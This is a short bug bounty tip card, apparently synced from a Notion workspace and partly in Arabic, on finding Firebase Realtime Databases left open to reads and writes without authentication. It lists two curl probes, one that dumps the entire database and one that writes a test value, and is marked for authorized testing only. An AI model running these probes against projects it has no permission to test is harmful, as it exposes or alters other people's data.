# Firebase Realtime DB open rules (read/write without auth)

**Rating:** 🔥 قوية  
**Category:** Recon, API Hacking  
**Status:** Not started  

## How It Works

دور على PROJECT.firebaseio.com أو من الـ JS. جرب /.json بدون auth. لو رجع data أو قبل write → High.

## Payload / Code

```
curl https://PROJECT-default-rtdb.firebaseio.com/.json
curl -X PUT -d '{"test":1}' https://PROJECT-default-rtdb.firebaseio.com/test.json
```

## Source

Multiple 2025-2026 writeups + GCP playbook

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
